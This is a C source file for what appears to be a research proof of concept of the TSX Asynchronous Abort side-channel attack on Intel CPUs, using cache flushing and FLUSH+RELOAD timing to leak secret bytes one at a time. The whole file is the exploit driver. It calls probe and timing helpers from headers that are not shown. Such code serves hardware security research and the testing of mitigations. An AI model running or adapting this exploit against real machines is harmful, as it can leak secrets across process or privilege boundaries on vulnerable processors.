#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <x86intrin.h>

#include <sys/mman.h>

#include <args.h>
#include <memkit.h>
#include <utils.h>

size_t secret_len;

int main(int argc, char *argv[])
{
	struct hit_count results[256];
	struct args args;
	unsigned char *leak;
	unsigned char *buffer;
	unsigned char *attack;
	size_t i, k, round;
	size_t count;

	if (parse_args(&args, argc, argv) < 2) {
		fprintf(stderr, "usage: %s [<options>] <count>\n", argv[0]);
		return -1;
	}

	secret_len = strtoull(argv[1], NULL, 0);

	/* Allocate the leak buffer. */
	leak = calloc(secret_len, sizeof *leak);

	if (!leak) {
		printf(" [-] unable to allocate the leak buffer\n");
		return -1;
	}

	printf(" [+] allocated the leak buffer\n");

	/* Allocate the attack page. */
	attack = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

	if (attack == MAP_FAILED) {
		printf(" [-] unable to allocate the attack page\n");
		goto err_free_leak;
	}

	printf(" [+] allocated the attack page\n");

	memset(attack, 0, 4096);

	/* Allocate a buffer for FLUSH + RELOAD. */
	buffer = mmap(NULL, 256 * 4096, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

	if (buffer == MAP_FAILED) {
		printf(" [-] unable to allocate the FLUSH + RELOAD buffer\n");
		goto err_unmap_attack;
	}

	memset(buffer, 0, 256 * 4096);
	printf(" [+] allocated a buffer for FLUSH + RELOAD\n");

	for (i = 0; i < secret_len; ++i) {
		/* Reset the results. */
		clear_results(results);

		for (round = 0; round < args.rounds; ++round) {
#ifdef STRICT_AC
			/* Enable alignment checks. */
			enable_ac();
#endif

			/* Flush the FLUSH + RELOAD buffer. */
			for (k = 0; k < 256; ++k) {
				_mm_clflush(buffer + ((k + 5 * round) % 256) * STRIDE);
			}

			_mm_mfence();

			/* Flush the cache line used by the TSX transaction to
			 * trigger an asynchronous abort.
			 */
			_mm_clflush(attack + i);
			_mm_sfence();
			_mm_clflush(buffer);

			/* Try to leak using TAA. */
#ifdef TSX
			tsx_probe2(buffer, attack + i);
#else
			retpol_probe2(buffer, attack + i);
#endif

			/* Reconstruct the value by timing the FLUSH + RELOAD buffer. */
			time_buffer(results, buffer, 100);

#ifdef STRICT_AC
			/* Disable alignment checks. */
			disable_ac();
#endif
		}

		/* Find the value that got the most hits. */
		match_best(leak + i, &count, results);
	}

	/* Display the result. */
	print_result(leak, secret_len, attack);

	/* Clean up. */
	munmap(buffer, 256 * 4096);
	munmap(attack, 4096);
	free(leak);

	return 0;

err_unmap_attack:
	munmap(attack, 4096);
err_free_leak:
	free(leak);
	return -1;
}

